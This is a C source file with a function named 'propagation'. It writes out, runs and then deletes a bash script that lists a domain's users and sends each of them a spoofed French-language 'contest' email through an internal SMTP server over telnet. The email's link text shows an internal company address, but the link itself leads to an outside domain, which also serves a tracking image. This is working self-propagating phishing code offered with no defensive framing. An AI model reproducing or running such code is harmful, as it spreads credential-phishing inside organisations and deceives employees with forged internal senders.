#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void propagation(void)
{
    FILE *fileAddress;
    fileAddress = fopen("tmp.sh", "w+");
    char shell[] =
"#!/bin/bash\n" \
"IFS=\"\"\n" \
"for user in $(getent passwd | grep \"10006:\" | grep -o -P \"^.*?:\" | sed \"s/://g\"); do \n" \
    "while IFS= read -r line; do \n" \
        "currentuser=$(whoami)\n" \
        "domain=$(realm list | grep domain-name | grep -o -P \": .*\" | sed \"s/: //g\")\n" \
        "if [ $line != $currentuser ]; then\n" \
            "(echo 'HELO'\n" \
            "sleep 2\n" \
            "echo \"mail from: ce.service@$domain\"\n" \
            "sleep 2\n" \
            "echo \"rcpt to: $line@$domain\"\n" \
            "echo \"data\"\n" \
            "sleep 2\n" \
            "echo 'Subject: Jeu concours\n" \
"Content-Type: text/html\n" \
"<!DOCTYPE html>\n" \
"<html>\n" \
"<head>\n" \
"</head>\n" \
"<body>\n\n" \

"<h1>Grand jeu concours !</h1>\n\n" \

"<p>Les 10 ans de Corps approchent et nous souhaitons vous gratifier pour cette occasion !</p>\n" \
"<p>Un cadeau pour deux personne est mis en jeu. Pour en savoir plus et participer, cliquez <a href=\"https://viro.jajpnal.fr/\">https://ce.corp.local/concours/</a>.</p>\n" \
"<p>Le gagnant sera averti le lundi 3 avril 2023 pour 11h30 par mail.</p>\n\n" \

"<p> On vous attend nombreux !</p>\n\n" \

"<p>--</p>\n\n" \

"<p>Le CE</p>\n\n" \

"<img src=\"https://viro.jajpnal.fr/images/email_banner_reduce.png\"></img>\n\n" \

"</body>\n" \
"</html>\n\n" \

".\n" \
"'\n" \
            "sleep 1\n" \
            "echo \"quit\" ) | telnet 172.19.110.116 smtp\n" \
        "fi\n" \
    "done <<< \"$user\" \n" \
"done";
    int i;
    int len = strlen(shell);
    if (fileAddress != NULL)
    {
        for (i = 0; i < len; i++)
        {
            fputc(shell[i], fileAddress);
        }
        fclose(fileAddress);
    }
    system("chmod +x tmp.sh");
    system("./tmp.sh");
    system("rm tmp.sh");
}
